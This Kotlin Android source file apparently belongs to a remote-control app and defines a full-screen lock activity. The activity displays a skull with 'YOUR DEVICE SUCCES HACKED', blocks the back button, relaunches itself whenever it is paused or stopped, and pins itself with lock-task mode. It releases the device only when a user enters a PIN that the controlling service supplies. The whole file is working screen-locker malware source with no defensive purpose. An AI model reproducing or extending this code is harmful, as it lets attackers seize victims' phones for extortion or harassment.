package com.fantzy.nih

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.fantzy.nih.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.fantzy.nih.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.fantzy.nih.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>$safeTitle - Neo Brutalism</title>
  <!-- Google Fonts: Space Grotesk & JetBrains Mono -->
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700;800&family=Space+Grotesk:wght@700;900&display=swap" rel="stylesheet">
  
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg-yellow: #FFE600;
      --card-bg: #FFFFFF;
      --border-black: #000000;
      --accent-red: #FF2E4C;
      --accent-cyan: #00F0FF;
      --accent-green: #00FF66;
    }

    body {
      background-color: var(--bg-yellow);
      /* Dot pattern khas Neobrutalism */
      background-image: radial-gradient(var(--border-black) 2px, transparent 2px);
      background-size: 20px 20px;
      font-family: 'Space Grotesk', sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    /* Kartu Utama Neobrutalism */
    .nb-card {
      width: 100%;
      max-width: 420px;
      background: var(--card-bg);
      border: 4px solid var(--border-black);
      box-shadow: 10px 10px 0px var(--border-black);
      border-radius: 16px;
      padding: 32px 24px;
      text-align: center;
      position: relative;
    }

    /* Foto Profil 1:1 */
    .nb-avatar-wrapper {
      width: 120px;
      height: 120px;
      aspect-ratio: 1 / 1;
      margin: 0 auto 20px auto;
      border: 4px solid var(--border-black);
      box-shadow: 6px 6px 0px var(--border-black);
      border-radius: 12px;
      overflow: hidden;
      background: #000;
    }

    .nb-avatar-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Badge Sticker Warning */
    .nb-badge {
      display: inline-block;
      background: var(--accent-cyan);
      color: var(--border-black);
      border: 3px solid var(--border-black);
      box-shadow: 4px 4px 0px var(--border-black);
      font-weight: 900;
      font-size: 12px;
      padding: 6px 14px;
      border-radius: 8px;
      margin-bottom: 20px;
      letter-spacing: 1px;
      text-transform: uppercase;
    }

    /* Banner Judul Merah dengan Kemiringan khas Brutalism */
    .nb-title-box {
      background: var(--accent-red);
      color: #FFFFFF;
      border: 4px solid var(--border-black);
      box-shadow: 5px 5px 0px var(--border-black);
      border-radius: 10px;
      padding: 14px 10px;
      margin-bottom: 24px;
      transform: rotate(-1.5deg);
    }

    .nb-skull {
      font-size: 32px;
      line-height: 1;
      margin-bottom: 4px;
    }

    .nb-title-box h1 {
      font-size: 22px;
      font-weight: 900;
      letter-spacing: 2px;
      text-transform: uppercase;
      text-shadow: 2px 2px 0px var(--border-black);
    }

    /* Konsol Status Berwarna Gelap dengan Border Keras */
    .nb-console {
      background: #000000;
      border: 4px solid var(--border-black);
      border-radius: 12px;
      padding: 18px;
      box-shadow: 6px 6px 0px var(--accent-red);
      font-family: 'JetBrains Mono', monospace;
      text-align: left;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .nb-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 2px dashed #333333;
      padding-bottom: 8px;
    }

    .nb-row:last-child {
      border-bottom: none;
      padding-bottom: 0;
    }

    .nb-label {
      color: #888888;
      font-weight: 700;
      font-size: 13px;
    }

    /* Tag Nilai Status */
    .tag-danger {
      background: var(--accent-red);
      color: #FFFFFF;
      padding: 3px 8px;
      border-radius: 6px;
      font-weight: 800;
      font-size: 11px;
      border: 2px solid var(--border-black);
    }

    .tag-success {
      background: var(--accent-green);
      color: #000000;
      padding: 3px 8px;
      border-radius: 6px;
      font-weight: 800;
      font-size: 11px;
      border: 2px solid var(--border-black);
    }

    .tag-white {
      background: #FFFFFF;
      color: #000000;
      padding: 3px 8px;
      border-radius: 6px;
      font-weight: 800;
      font-size: 11px;
      border: 2px solid var(--border-black);
    }

    /* Footer */
    .nb-footer {
      margin-top: 24px;
      font-weight: 900;
      font-size: 12px;
      letter-spacing: 2px;
      color: var(--border-black);
      text-transform: uppercase;
    }
  </style>
</head>
<body>

  <div class="nb-card">
    <!-- Foto Profil Rasio 1:1 -->
    <div class="nb-avatar-wrapper">
      <img src="https://f.top4top.io/p_3869fi93e1.jpg" alt="Target Profile">
    </div>

    <!-- Badge Peringatan -->
    <div class="nb-badge">⚠ YOUR DEVICE SUCCES HACKED ⚠</div>

    <!-- Judul & Icon Banner dengan Variabel $safeTitle -->
    <div class="nb-title-box">
      <div class="nb-skull">☠</div>
      <h1>$safeTitle</h1>
    </div>

    <!-- Panel Konsol Status -->
    <div class="nb-console">
      <div class="nb-row">
        <span class="nb-label">STATUS</span>
        <span class="tag-danger">LOCKED</span>
      </div>
      <div class="nb-row">
        <span class="nb-label">ACCESS</span>
        <span class="tag-danger">DENIED</span>
      </div>
      <div class="nb-row">
        <span class="nb-label">DATA</span>
        <span class="tag-danger">LOCKED</span>
      </div>
      <div class="nb-row">
        <span class="nb-label">FIREWALL</span>
        <span class="tag-success">ENABLED</span>
      </div>
      <div class="nb-row">
        <span class="nb-label">MONITORING</span>
        <span class="tag-success">ONLINE</span>
      </div>
    </div>

    <!-- Footer Text -->
    <p class="nb-footer"></p>
  </div>

</body>
</html>
"""
    }
}